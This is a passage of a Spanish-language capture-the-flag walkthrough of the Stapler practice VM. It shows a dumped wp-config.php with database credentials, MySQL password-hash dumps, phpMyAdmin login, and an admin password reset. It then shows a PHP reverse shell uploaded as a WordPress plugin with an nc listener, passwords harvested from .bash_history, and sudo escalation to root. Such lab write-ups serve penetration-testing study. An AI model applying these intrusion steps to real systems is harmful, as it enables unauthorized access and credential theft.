 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);
```

Lo más importante de ese script:

```php
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');
```

Tenemos nombre de DB, usuario y password. Casualmente el servicio de MySQL tiene el servicio abierto jejeje.

>**``mysql -uroot -pplbkac -h 10.0.0.127``**

```sql
MySQL [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.000 sec)

MySQL [wordpress]> select user_login from wp_users; select user_pass from wp_users;
+------------+
| user_login |
+------------+
| Abby       |
| barry      |
| Dave       |
| Elly       |
| garry      |
| harry      |
| heather    |
| John       |
| kathy      |
| Pam        |
| Peter      |
| scott      |
| Simon      |
| tim        |
| Vicki      |
| ZOE        |
+------------+
16 rows in set (0.001 sec)

+------------------------------------+
| user_pass                          |
+------------------------------------+
| $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------------------------------+
16 rows in set (0.000 sec)

```
---

```sql
MySQL [mysql]> select user from user; select authentication_string from user;
+------------------+
| user             |
+------------------+
| root             |
| debian-sys-maint |
| mysql.session    |
| mysql.sys        |
| phpmyadmin       |
| root             |
+------------------+
6 rows in set (0.000 sec)

+-------------------------------------------+
| authentication_string                     |
+-------------------------------------------+
| *9B2DDC0D01126C483D173FB2A0ED14FFEC2B45AA |
| *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| *DA79B10C207695571B8B72309996531AC6504291 |
| *5153994ADAD440E919F0FD79B30131EB30A54CBB |
| *9B2DDC0D01126C483D173FB2A0ED14FFEC2B45AA |
| *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+-------------------------------------------+
6 rows in set (0.000 sec)
```

Ok. ¿Que carajo hago tantos hashes? Porque parecen ser MD5 pero tamnbién parecen tener un [salt](https://es.wikipedia.org/wiki/Sal_(criptograf%C3%ADa).

Por el momento veo que el paswword del usuario admin de **PHPMyAdmin** es el mismo que el del usuario **root** de **MySQL** que ya conocemos. Probé suerte para loguearme en: ``https://10.0.0.127:12380/phpmyadmin/`` con esa pareja de credenciales y pude entrar!!

Una vez adentro decidi cambiar el password de un usuario admin de **Wordpress**. Para eso seguí el siguiente [tutorial](https://www.wpbeginner.com/beginners-guide/beginners-guide-to-wordpress-database-management-with-phpmyadmin/#resetpassword). Bastante simple:

---

![img]({{ '/assets/images/Stapler/phpmyadmin_03.png' | relative_url }}){: .center-image }*(Editar el usuario)*

---

![img]({{ '/assets/images/Stapler/phpmyadmin_04.png' | relative_url }}){: .center-image }*(Editar el password)*

---

Después de eso se puede acceder a **Wordpress** con el usuario *Vicki* con privilegios de administrador del sitio. ¿Que tiene esto de bueno? Podemos subir un shell reverso!!

Nuevamenta voy a utilizar el script de [PentestMonkey](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz), modificarlo con la IP de la VM atacante y crear una conexión con **Netcat** para recibir el shell reverso.

Una vez que el código está modificado hay que seleccionarlo y pegarlo en la siguiente pantalla:

---

![img]({{ '/assets/images/Stapler/wordpress_04.png' | relative_url }}){: .center-image }*(Editar página de 404 del theme)*

---

Me di la cabeza contra la pantalla cuando me di cuenta que no se pueden modificar los archivos del servidor web sin tocar el file system así que me claudiqué con esa opción. Lo que fue mucho más fácil fue subir el shell reverso como si fuera un Plugin. Dentro de **Wordpress**:

1- Ir a **Plugins**
2- Tocar el botón de **Add New**
3- Tocar el botón de **Upload Plugin**
4- **Browse** y seleccionar el archivo.
5- **install Now**

Solo resta levantar la conexión de **Netcat**:

> **``nc -nlvp 1234``**

ingresar al sitio ``https://10.0.0.127:12380/blogblog/wp-content/uploads/php-reverse-shell.php``

---

```console
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.0.127.
Ncat: Connection from 10.0.0.127:59778.
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 13:01:52 up 17:05,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
---

> **``python -c 'import pty; pty.spawn("/bin/bash");'``**

Una vez adentro hay una tremenda cantidad de usuarios creados, el más importante por el momento fue **JKanode** que tenía un ``.bash_history`` con credenciales:

```console
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
```

Vamos a buscarlo a Peter...

>**``ssh peter@10.0.0.127``** con el password **JZQuyIN5** y entré perfecto. Lo malo es que caí a un Shell Restringido.

y de nuevo escapamos con el glorioso comando > **``python -c 'import pty; pty.spawn("/bin/bash");'``**

---

No tuve que enumerar mucho tiempo hasta que me di cuenta que el comando ``sudo -l`` arroja el siguiente resultado:

```console
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```
Osea que puedo correr todos los comandos que quiera con ``sudo``!!

---

### **Flag**

---
Dentro de la carpeta ``/root`` existe una archivo llamado ``flag.txt`` su contenido:

```console
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
---

### **Conclusión**

---

Esta es un pedazo de VM, tiene varias formas de entrar y varias formas de escalar. Yo solamente descubrí una forma pero puede entretener por horas y horas, me gustaría que todas fueran así.

---